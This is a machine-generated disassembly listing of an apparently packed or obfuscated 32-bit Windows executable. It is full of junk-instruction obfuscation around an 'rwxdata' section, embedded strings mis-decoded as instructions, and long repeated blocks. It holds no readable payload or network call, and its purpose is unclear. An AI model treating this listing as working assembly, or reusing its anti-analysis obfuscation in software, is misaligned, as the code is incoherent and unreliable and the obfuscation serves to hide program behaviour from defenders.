sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
xor eax eax
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
daa
popad
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
popad
hlt
loope rwxdata
inc edx
jns rwxdata
jmp rwxdata
and al 0x24
je rwxdata
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
cmc
add [ edi + ebx ] ax
sub_4226a5
adc ecx ecx
pushad
mov [ esp ] ax
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
call sub_42250b
btc si cx
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_4229ef
[ edi ] [ esi ]
pop esi
pop esi
movsx si dl
movzx si dl
mov esi [ esp + 0x30 ]
pushfd
pushfd
mov [ esp ] bp
lea esp [ esp + 0x3c ]
jmp rwxdata
jmp rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_422a18
lea esp [ esp + 0x4 ]
call sub_4225ad
stc
bt sp bp
pushad
sub ecx ebx
call sub_426a06
and ebx 0xfff
cmp cl 0xb2
jmp rwxdata
cmc
add [ edi + ebx ] ax
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
daa
popad
je rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
popad
hlt
loope rwxdata
inc edx
jns rwxdata
jmp rwxdata
and al 0x24
je rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
sub_422a89
lea esp [ esp + 0x30 ]
je rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
cmc
call sub_425488
pop edi
xor ebp [ edi ]
pop ebx
xlat
retn
sub_422b90
mov [ esp ] edx
call sub_420510
add [ eax ] al
inc edi
je rwxdata
je rwxdata
imul ebp [ ebp + 0x54 ] 0x657079
inc esi
imul ebp [ ebp + 0x20 ] 0x72726f63
jne rwxdata
imul bp [ ebp + 0x20 ] 0x6f77
outsb
daa
jae rwxdata
outsd
jb sub_422c89
je rwxdata
or [ edi ] cl
test [ edx ] ch
add [ eax ] al
ja sub_422c89
je rwxdata
push esp
push 0x66207369
imul ebp [ ebp + 0x20 ] 0x276e6f77
imul ebp [ esi + 0x66 ] 0x65746365
and [ fs : edx + 0x79 ] ah
add [ cs : edi + 0x60 ] dl
and [ fs : esi ] ebp
and [ eax + ebp * 2 + 0x69 ] dl
jae rwxdata
jmp rwxdata
push ecx
lea esp [ esp + 0x4 ]
jne rwxdata
jb rwxdata
je rwxdata
inc eax
add al [ eax ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
jae rwxdata
and [ ebp + 0x61 ] ch
jo rwxdata
lea esp [ esp + 0x24 ]
call sub_422e71
pushfd
pushfd
adc al al
lea esp [ esp + 0x8 ]
push edi
pushad
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
push ebp
stosb [ edi ]
push [ esp ]
push edi
lea esp [ esp + 0xc ]
jmp rwxdata
add [ eax ] al
and [ ecx + 0x6e ] ah
jns rwxdata
push 0x4ea24984
push [ esp ]
pushfd
mov [ esp + 0x4 ] dh
lea esp [ esp + 0xc ]
jne rwxdata
add [ eax ] al
and [ ecx + 0x20 ] ah
push esi
imul esi [ edx + 0x75 ] 0x726f2073
and [ ebx + 0x72 ] ah
popad
arpl [ ebx + 0x65 ] bp
and [ cs : eax + ebp * 2 + 0x69 ] dl
jae rwxdata
or eax 0x73277469
and [ ecx + 0x6e ] ch
arpl [ gs : ebp + 0x64 ] si
and [ edx + 0x79 ] ah
add [ esp + ebx * 4 + 0x648dc010 ] bl
and al 0x8
outsd
jb rwxdata
jmp rwxdata
mov [ esp ] dx
sub al 0x4f
pushfd
rol al 0x3
call sub_426734
push 0x6109aee2
call sub_4326f7
pushfd
stosb [ edi ]
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
add [ cs : edi + 0x60 ] dl
insd
and [ eax + 0x61 ] ch
jae rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
jns rwxdata
bound esp [ ebp + 0x65 ]
outsb
and [ ebp + 0x61 ] ch
outsb
imul esi [ eax + 0x75 ] 0x6574616c
and [ fs : ecx + 0x6e ] ah
and [ fs : ebp + 0x61 ] ch
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_422d3b
lea esp [ esp + 0x30 ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
inc di
add edx ebx
test dl 0xed
neg edi
mov [ ebp - 0x4 ] edx
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
